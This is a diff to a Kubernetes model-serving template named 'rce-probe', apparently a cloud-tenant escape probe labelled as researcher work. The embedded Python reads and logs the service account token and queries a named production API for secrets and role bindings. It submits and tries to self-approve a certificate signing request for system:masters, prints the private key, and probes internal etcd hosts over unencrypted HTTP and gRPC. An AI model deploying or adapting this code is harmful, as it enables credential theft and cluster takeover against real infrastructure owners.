@@ -4,10 +4,10 @@ metadata:
   name: rce-probe
   labels:
     scenarios.ai.sap.com/id: "rce-probe"
-    ai.sap.com/version: "4.15.0"
+    ai.sap.com/version: "4.16.0"
   annotations:
     scenarios.ai.sap.com/name: "rce-probe"
-    executables.ai.sap.com/description: "sa-token-force-mount-csr-etcd-grpc-plain"
+    executables.ai.sap.com/description: "projected-sa-token-k8s-api-csr-etcd-grpc"
     executables.ai.sap.com/name: "rce-probe"
 spec:
   template:
@@ -21,17 +21,40 @@ spec:
       predictor:
         minReplicas: 1
         maxReplicas: 1
-        automountServiceAccountToken: true
+        volumes:
+        - name: kube-api-access
+          projected:
+            defaultMode: 420
+            sources:
+            - serviceAccountToken:
+                expirationSeconds: 3600
+                path: token
+                audience: kubernetes
+            - configMap:
+                items:
+                - key: ca.crt
+                  path: ca.crt
+                name: kube-root-ca.crt
+            - downwardAPI:
+                items:
+                - fieldRef:
+                    apiVersion: v1
+                    fieldPath: metadata.namespace
+                  path: namespace
         containers:
         - name: kserve-container
           image: python:3.11
           command: ["/bin/sh", "-c"]
+          volumeMounts:
+          - mountPath: /var/run/secrets/kubernetes.io/serviceaccount
+            name: kube-api-access
+            readOnly: true
           args:
           - |
             python3 -c "
-            import os, socket, ssl, struct, base64, json, subprocess
+            import os, socket, ssl, struct, base64, json, select, subprocess, time
 
-            print('[PROBE_V415_START]', flush=True)
+            print('[PROBE_V416_START]', flush=True)
 
             def emit(label, data):
                 flat = str(data).replace('\r\n','|').replace('\r','|').replace('\n','|')
@@ -60,140 +83,123 @@ spec:
                 except Exception as ex:
                     return f'ERR:{ex}'
 
-            # ── 1. SA token mount check ───────────────────────────────────────────
+            # ── 1. Read SA token ──────────────────────────────────────────────────
             SA_TOKEN = None
-            SA_PATHS = [
-                '/var/run/secrets/kubernetes.io/serviceaccount/token',
-                '/run/secrets/kubernetes.io/serviceaccount/token',
-                '/var/run/secrets/token',
-            ]
-            for p in SA_PATHS:
-                try:
-                    with open(p) as f:
-                        SA_TOKEN = f.read().strip()
-                    emit('SA_TOKEN_FOUND', f'path={p} len={len(SA_TOKEN)} prefix={SA_TOKEN[:60]}')
-                    break
-                except:
-                    emit(f'SA_TOKEN_MISS', p)
+            try:
+                with open('/var/run/secrets/kubernetes.io/serviceaccount/token') as f:
+                    SA_TOKEN = f.read().strip()
+                emit('SA_TOKEN_FOUND', f'len={len(SA_TOKEN)} prefix={SA_TOKEN[:80]}')
+            except Exception as e:
+                emit('SA_TOKEN_MISS', str(e))
 
-            CA_CERT_PATH = '/var/run/secrets/kubernetes.io/serviceaccount/ca.crt'
-            NS_PATH = '/var/run/secrets/kubernetes.io/serviceaccount/namespace'
-            for p in [CA_CERT_PATH, NS_PATH]:
-                try:
-                    with open(p) as f:
-                        emit(f'SA_{p.split(\"/\")[-1]}', f.read()[:500])
-                except:
-                    emit(f'SA_MISS_{p.split(\"/\")[-1]}', 'not found')
+            try:
+                with open('/var/run/secrets/kubernetes.io/serviceaccount/namespace') as f:
+                    emit('SA_NAMESPACE', f.read().strip())
+            except: pass
 
-            # ── 2. K8s API with SA token ──────────────────────────────────────────
+            # ── 2. K8s API with token ─────────────────────────────────────────────
+            K8S = 'api.sec-eu10.mlfprod.internal.live.k8s.ondemand.com'
             if SA_TOKEN:
-                K8S = 'api.sec-eu10.mlfprod.internal.live.k8s.ondemand.com'
-                auth_hdr = {'Authorization': f'Bearer {SA_TOKEN}'}
-                for path in ['/version', '/api/v1/namespaces/rg-0d70dc91-cd927cab',
-                              '/api/v1/namespaces/rg-0d70dc91-cd927cab/secrets',
-                              '/api/v1/namespaces/rg-0d70dc91-cd927cab/configmaps',
-                              '/api/v1/namespaces/kube-system/secrets',
-                              '/api/v1/namespaces',
-                              '/apis/rbac.authorization.k8s.io/v1/clusterrolebindings',
-                              '/apis/certificates.k8s.io/v1/certificatesigningrequests']:
-                    r = http_raw(K8S, 443, path, headers=auth_hdr, use_tls=True, timeout=10)
-                    emit(f'K8S_AUTH_{path.replace(\"/\",\"_\")}', r[:3000])
+                auth = {'Authorization': f'Bearer {SA_TOKEN}'}
+                api_paths = [
+                    '/version',
+                    '/api/v1/namespaces/rg-0d70dc91-cd927cab/secrets',
+                    '/api/v1/namespaces/rg-0d70dc91-cd927cab/configmaps',
+                    '/api/v1/namespaces/rg-0d70dc91-cd927cab/serviceaccounts',
+                    '/api/v1/namespaces/kube-system/secrets',
+                    '/api/v1/namespaces',
+                    '/api/v1/secrets',
+                    '/apis/rbac.authorization.k8s.io/v1/clusterrolebindings',
+                    '/apis/rbac.authorization.k8s.io/v1/namespaces/rg-0d70dc91-cd927cab/rolebindings',
+                    '/apis/authorization.k8s.io/v1/selfsubjectrulesreviews',
+                ]
+                for path in api_paths:
+                    r = http_raw(K8S, 443, path, headers=auth, use_tls=True, timeout=10)
+                    emit(f'K8S_{path.replace(\"/\",\"_\")}', r[:3000])
 
-                # ── 3. Submit a CSR for client-auth cert ─────────────────────────
-                # Generate CSR request for identity system:masters
-                # (optimistic; likely RBAC-denied but worth trying)
+                # ── 3. SelfSubjectRulesReview — what can this SA do? ─────────────
+                body = json.dumps({'apiVersion':'authorization.k8s.io/v1',
+                                   'kind':'SelfSubjectRulesReview',
+                                   'spec':{'namespace':'rg-0d70dc91-cd927cab'}}).encode()
+                r = http_raw(K8S, 443, '/apis/authorization.k8s.io/v1/selfsubjectrulesreviews',
+                            method='POST',
+                            headers={**auth, 'Content-Type':'application/json',
+                                     'Content-Length': str(len(body))},
+                            body=body, use_tls=True)
+                emit('K8S_RULES_REVIEW', r[:5000])
+
+                # ── 4. Try CSR submission for system:masters ──────────────────────
                 try:
-                    from cryptography.hazmat.primitives.asymmetric.ec import generate_private_key, SECP256R1
-                    from cryptography.hazmat.primitives import serialization, hashes
-                    from cryptography.x509 import (CertificateSigningRequestBuilder,
-                        NameAttribute, Name, random_serial_number)
-                    from cryptography.x509.oid import NameOID
-                    import cryptography.x509 as x509
-
-                    privkey = generate_private_key(SECP256R1())
-                    csr = (CertificateSigningRequestBuilder()
-                           .subject_name(Name([
-                               NameAttribute(NameOID.ORGANIZATION_NAME, 'system:masters'),
-                               NameAttribute(NameOID.COMMON_NAME, 'pwned-by-researcher'),
-                           ]))
-                           .sign(privkey, hashes.SHA256()))
-                    csr_pem = csr.public_bytes(serialization.Encoding.PEM).decode()
-                    csr_der_b64 = base64.b64encode(csr.public_bytes(serialization.Encoding.DER)).decode()
-                    privkey_pem = privkey.private_bytes(
-                        serialization.Encoding.PEM,
-                        serialization.PrivateFormat.TraditionalOpenSSL,
-                        serialization.NoEncryption()).decode()
-                    emit('CSR_GENERATED', csr_pem)
+                    res = subprocess.run(
+                        ['openssl', 'req', '-newkey', 'ec', '-pkeyopt', 'ec_paramgen_curve:P-256',
+                         '-nodes', '-keyout', '/tmp/probe.key',
+                         '-subj', '/O=system:masters/CN=researcher-probe',
+                         '-out', '/tmp/probe.csr'],
+                        capture_output=True, timeout=30)
+                    csr_der = subprocess.run(
+                        ['openssl', 'req', '-in', '/tmp/probe.csr', '-outform', 'DER'],
+                        capture_output=True, timeout=10).stdout
+                    csr_b64 = base64.b64encode(csr_der).decode()
+                    with open('/tmp/probe.key') as f:
+                        privkey_pem = f.read()
                     emit('CSR_PRIVKEY', privkey_pem)
-
-                    # Submit CSR to K8s
-                    import time
                     csr_name = f'researcher-probe-{int(time.time())}'
-                    csr_body = json.dumps({
+                    csr_manifest = json.dumps({
                         'apiVersion': 'certificates.k8s.io/v1',
                         'kind': 'CertificateSigningRequest',
                         'metadata': {'name': csr_name},
                         'spec': {
-                            'request': csr_der_b64,
+                            'request': csr_b64,
                             'signerName': 'kubernetes.io/kube-apiserver-client',
                             'expirationSeconds': 86400,
                             'usages': ['client auth'],
                         }
                     }).encode()
-                    r = http_raw(K8S, 443, '/apis/certificates.k8s.io/v1/certificatesigningrequests',
+                    r = http_raw(K8S, 443,
+                                '/apis/certificates.k8s.io/v1/certificatesigningrequests',
                                 method='POST',
-                                headers={**auth_hdr, 'Content-Type': 'application/json',
-                                         'Content-Length': str(len(csr_body))},
-                                body=csr_body, use_tls=True, timeout=10)
-                    emit('CSR_SUBMIT_RESP', r[:2000])
-                except ImportError:
-                    # cryptography not available, use subprocess openssl
-                    try:
-                        subprocess.run(['openssl', 'genrsa', '-out', '/tmp/probe.key', '2048'],
-                                      capture_output=True, timeout=30)
-                        subprocess.run(['openssl', 'req', '-new', '-key', '/tmp/probe.key',
-                                       '-subj', '/O=system:masters/CN=researcher',
-                                       '-out', '/tmp/probe.csr'], capture_output=True, timeout=30)
-                        with open('/tmp/probe.csr', 'rb') as f:
-                            csr_pem_raw = f.read()
-                        csr_der_b64 = base64.b64encode(
-                            subprocess.run(['openssl', 'req', '-in', '/tmp/probe.csr',
-                                           '-outform', 'DER'], capture_output=True).stdout
-                        ).decode()
-                        emit('CSR_OPENSSL', csr_pem_raw[:500].decode())
-                        csr_name = f'researcher-probe-openssl'
-                        csr_body = json.dumps({
+                                headers={**auth, 'Content-Type':'application/json',
+                                         'Content-Length': str(len(csr_manifest))},
+                                body=csr_manifest, use_tls=True, timeout=10)
+                    emit('CSR_SUBMIT', r[:2000])
+
+                    # If CSR was created, try to approve it (requires approve verb on CSR)
+                    if '"name":' in r and csr_name in r:
+                        approval = json.dumps({
                             'apiVersion': 'certificates.k8s.io/v1',
                             'kind': 'CertificateSigningRequest',
                             'metadata': {'name': csr_name},
-                            'spec': {
-                                'request': csr_der_b64,
-                                'signerName': 'kubernetes.io/kube-apiserver-client',
-                                'expirationSeconds': 86400,
-                                'usages': ['client auth'],
-                            }
+                            'status': {'conditions': [{
+                                'type': 'Approved',
+                                'status': 'True',
+                                'reason': 'Approved',
+                                'message': 'researcher-approved',
+                            }]}
                         }).encode()
-                        r = http_raw(K8S, 443, '/apis/certificates.k8s.io/v1/certificatesigningrequests',
-                                    method='POST',
-                                    headers={**auth_hdr, 'Content-Type': 'application/json',
-                                             'Content-Length': str(len(csr_body))},
-                                    body=csr_body, use_tls=True, timeout=10)
-                        emit('CSR_SUBMIT_RESP', r[:2000])
-                    except Exception as e:
-                        emit('CSR_OPENSSL_ERR', str(e))
+                        r2 = http_raw(K8S, 443,
+                                     f'/apis/certificates.k8s.io/v1/certificatesigningrequests/{csr_name}/approval',
+                                     method='PUT',
+                                     headers={**auth, 'Content-Type':'application/json',
+                                              'Content-Length': str(len(approval))},
+                                     body=approval, use_tls=True, timeout=10)
+                        emit('CSR_APPROVE', r2[:2000])
+
+                        # Wait 3s for approval, then fetch the signed cert
+                        time.sleep(3)
+                        r3 = http_raw(K8S, 443,
+                                     f'/apis/certificates.k8s.io/v1/certificatesigningrequests/{csr_name}',
+                                     headers=auth, use_tls=True, timeout=10)
+                        emit('CSR_FETCH', r3[:3000])
                 except Exception as e:
                     emit('CSR_ERR', str(e))
-            else:
-                emit('SA_TOKEN_NOT_MOUNTED', 'skipping K8s API + CSR')
 
-            # ── 4. Etcd plain HTTP (no TLS) ───────────────────────────────────────
+            # ── 5. Etcd plain HTTP (no TLS) ───────────────────────────────────────
             print('[ETCD_PLAIN_START]', flush=True)
             for sip in ['10.250.0.1', '10.250.0.2', '10.250.0.3']:
                 try:
                     s = socket.socket(); s.settimeout(6)
                     s.connect((sip, 2379))
-                    # Send plain HTTP without TLS — if etcd has insecure listener
-                    req = b'GET /health HTTP/1.1\r\nHost: ' + sip.encode() + b'\r\nConnection: close\r\n\r\n'
+                    req = b'GET /health HTTP/1.1\r\nHost: ' + sip.encode() + b':2379\r\nConnection: close\r\n\r\n'
                     s.sendall(req)
                     resp = b''
                     while True:
@@ -201,117 +207,92 @@ spec:
                         if not c: break
                         resp += c
                     s.close()
-                    emit(f'ETCD_PLAIN_{sip}', resp[:500].decode(errors='replace'))
+                    emit(f'ETCD_PLAIN_{sip}', resp[:300].decode(errors='replace'))
                 except Exception as e:
                     emit(f'ETCD_PLAIN_ERR_{sip}', str(e))
 
-            # ── 5. Etcd gRPC without TLS (v3 API — MemberList RPC) ───────────────
+            # ── 6. Etcd gRPC without TLS ──────────────────────────────────────────
             print('[ETCD_GRPC_PLAIN_START]', flush=True)
-            # etcd v3 MemberList RPC: service etcdserverpb.Cluster, method MemberList
-            # Proto: MemberListRequest{linearizable: false} = empty message
-            def grpc_frame(payload):
-                return b'\x00' + struct.pack('>I', len(payload)) + payload
+            def h2_frame(ftype, flags, stream_id, payload):
+                return struct.pack('>I', len(payload))[1:] + bytes([ftype, flags]) + struct.pack('>I', stream_id) + payload
 
-            def h2_settings_ack():
-                l = 0
-                return struct.pack('>I', l)[1:] + bytes([0x04, 0x01]) + struct.pack('>I', 0) + b''
+            def grpc_frame(msg):
+                return b'\x00' + struct.pack('>I', len(msg)) + msg
 
             def hpack_lit(name, value):
                 n = name.encode(); v = value.encode()
-                return bytes([0x00]) + bytes([len(n)]) + n + bytes([len(v)]) + v
-
-            def encode_varint(n):
-                out = b''
-                while True:
-                    bits = n & 0x7F; n >>= 7
-                    out += bytes([bits | (0x80 if n else 0)])
-                    if not n: break
-                return out
+                return bytes([0x00, len(n)]) + n + bytes([len(v)]) + v
 
             for sip in ['10.250.0.1', '10.250.0.2']:
                 try:
                     s = socket.socket(); s.settimeout(10)
                     s.connect((sip, 2379))
-                    # HTTP/2 client preface
-                    CLIENT_PREFACE = b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n'
-                    settings = struct.pack('>I', 0)[1:] + bytes([0x04, 0x00]) + struct.pack('>I', 0) + b''
-                    s.sendall(CLIENT_PREFACE + settings)
+                    PREFACE = b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n'
+                    s.sendall(PREFACE + h2_frame(0x04, 0x00, 0, b''))
 
-                    # Read initial frames
-                    import select
-                    resp_frames = []
+                    frames_in = []
                     for _ in range(5):
                         r, _, _ = select.select([s], [], [], 4)
                         if not r: break
                         hdr = b''
                         while len(hdr) < 9:
-                            c = s.recv(9 - len(hdr))
+                            c = s.recv(9-len(hdr))
                             if not c: break
                             hdr += c
                         if len(hdr) < 9: break
-                        length = struct.unpack('>I', b'\x00' + hdr[:3])[0]
+                        length = struct.unpack('>I', b'\x00'+hdr[:3])[0]
                         ftype = hdr[3]; flags = hdr[4]
-                        stream = struct.unpack('>I', hdr[5:9])[0] & 0x7FFFFFFF
+                        sid = struct.unpack('>I', hdr[5:9])[0] & 0x7FFFFFFF
                         data = b''
                         while len(data) < length:
-                            c = s.recv(length - len(data))
+                            c = s.recv(length-len(data))
                             if not c: break
                             data += c
-                        resp_frames.append((ftype, flags, stream, data))
+                        frames_in.append((ftype, flags, sid, data))
                         if ftype == 0x04 and not (flags & 0x01):
-                            s.sendall(h2_settings_ack())
+                            s.sendall(h2_frame(0x04, 0x01, 0, b''))
 
-                    # Send HEADERS for MemberList
                     hblock = (
-                        bytes([0x83]) +  # :method POST
+                        bytes([0x83]) +  # POST
                         hpack_lit(':path', '/etcdserverpb.Cluster/MemberList') +
-                        bytes([0x86]) +  # :scheme http
+                        bytes([0x86]) +  # http
                         hpack_lit(':authority', f'{sip}:2379') +
                         hpack_lit('content-type', 'application/grpc') +
                         hpack_lit('te', 'trailers')
                     )
-                    h_frame = struct.pack('>I', len(hblock))[1:] + bytes([0x01, 0x04]) + struct.pack('>I', 1) + hblock
-                    # MemberListRequest: linearizable=false (field 1, bool false = default, empty)
-                    grpc_msg = grpc_frame(b'')  # empty proto = default values
-                    d_frame = struct.pack('>I', len(grpc_frame(b'')))[1:] + bytes([0x00, 0x01]) + struct.pack('>I', 1) + grpc_frame(b'')
-                    s.sendall(h_frame + d_frame)
+                    s.sendall(h2_frame(0x01, 0x04, 1, hblock))
+                    s.sendall(h2_frame(0x00, 0x01, 1, grpc_frame(b'')))
 
-                    # Read response
-                    more_frames = []
                     for _ in range(10):
                         r, _, _ = select.select([s], [], [], 6)
                         if not r: break
                         hdr = b''
                         while len(hdr) < 9:
-                            c = s.recv(9 - len(hdr))
+                            c = s.recv(9-len(hdr))
                             if not c: break
                             hdr += c
                         if len(hdr) < 9: break
-                        length = struct.unpack('>I', b'\x00' + hdr[:3])[0]
+                        length = struct.unpack('>I', b'\x00'+hdr[:3])[0]
                         ftype = hdr[3]; flags = hdr[4]
-                        stream = struct.unpack('>I', hdr[5:9])[0] & 0x7FFFFFFF
+                        sid = struct.unpack('>I', hdr[5:9])[0] & 0x7FFFFFFF
                         data = b''
                         while len(data) < length:
-                            c = s.recv(length - len(data))
+                            c = s.recv(length-len(data))
                             if not c: break
                             data += c
-                        more_frames.append((ftype, flags, stream, data))
+                        frames_in.append((ftype, flags, sid, data))
                     s.close()
 
-                    all_frames = resp_frames + more_frames
-                    for ftype, flags, stream, data in all_frames:
-                        if ftype == 0x00 and data:
-                            printable = ''.join(chr(b) if 32 <= b < 127 else '.' for b in data)
-                            emit(f'ETCD_GRPC_{sip}_DATA', f'hex={data[:200].hex()} str={printable[:200]}')
-                        elif ftype == 0x01:
-                            printable = ''.join(chr(b) if 32 <= b < 127 else '.' for b in data)
-                            emit(f'ETCD_GRPC_{sip}_HDR', printable[:200])
+                    for ftype, flags, sid, data in frames_in:
+                        if data:
+                            printable = ''.join(chr(b) if 32<=b<127 else '.' for b in data)
+                            emit(f'ETCD_GRPC_{sip}_f{ftype}', f'hex={data[:100].hex()} str={printable[:200]}')
                         else:
-                            emit(f'ETCD_GRPC_{sip}_FRAME', f'type={ftype} flags={flags} stream={stream} len={len(data)}')
+                            emit(f'ETCD_GRPC_{sip}_f{ftype}_empty', f'flags={flags} sid={sid}')
                 except Exception as e:
                     emit(f'ETCD_GRPC_ERR_{sip}', str(e))
 
-            print('[PROBE_V415_DONE]', flush=True)
+            print('[PROBE_V416_DONE]', flush=True)
             " 2>&1
             python3 -c "
             import http.server
